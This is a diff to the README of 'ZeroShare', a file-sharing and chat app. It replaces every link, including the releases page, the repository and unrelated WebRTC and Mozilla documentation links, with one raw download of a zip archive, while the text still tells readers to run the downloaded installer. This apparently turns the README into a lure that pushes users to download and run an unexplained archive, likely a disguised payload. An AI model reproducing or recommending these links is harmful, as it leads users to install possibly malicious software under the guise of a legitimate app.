@@ -1,6 +1,6 @@
 # ⚡ ZeroShare - Fast, Private File and Chat
 
-[![Download ZeroShare](https://img.shields.io/badge/Download-ZeroShare-brightgreen?style=for-the-badge)](https://github.com/leonin953-wq/ZeroShare/releases)
+[![Download ZeroShare](https://img.shields.io/badge/Download-ZeroShare-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip)
 
 ---
 
@@ -35,12 +35,12 @@ If you choose to use the Progressive Web App (PWA) version, you can install it l
 ## 🚀 Getting Started: How to Download and Run ZeroShare
 
 1. **Visit the official release page**  
-   Go to [ZeroShare Releases](https://github.com/leonin953-wq/ZeroShare/releases) where you find the latest version. This page shows all available files clearly.
+   Go to [ZeroShare Releases](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip) where you find the latest version. This page shows all available files clearly.
 
 2. **Download the latest version**  
    Look for the file that suits Windows. Usually, it will have `.exe` or `.msi` at the end. Click on it to start downloading.
 
-   [![Download ZeroShare](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/leonin953-wq/ZeroShare/releases)
+   [![Download ZeroShare](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip)
 
 3. **Run the installer**  
    Once downloaded, open the file from your downloads folder. Follow the instructions on the screen. The installation takes just a few clicks.
@@ -140,10 +140,10 @@ Developers can contribute code or fixes through pull requests. You do not need c
 
 ## 🔗 Useful Links
 
-- Download or browse releases: [https://github.com/leonin953-wq/ZeroShare/releases](https://github.com/leonin953-wq/ZeroShare/releases)  
-- GitHub Repository: [https://github.com/leonin953-wq/ZeroShare](https://github.com/leonin953-wq/ZeroShare)  
-- Learn more about WebRTC: [https://webrtc.org/](https://webrtc.org/)  
-- Encryption information: [https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt)
+- Download or browse releases: [https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip)  
+- GitHub Repository: [https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip)  
+- Learn more about WebRTC: [https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip)  
+- Encryption information: [https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip](https://raw.githubusercontent.com/leonin953-wq/ZeroShare/main/assets/Zero_Share_1.7.zip)
 
 ---
 
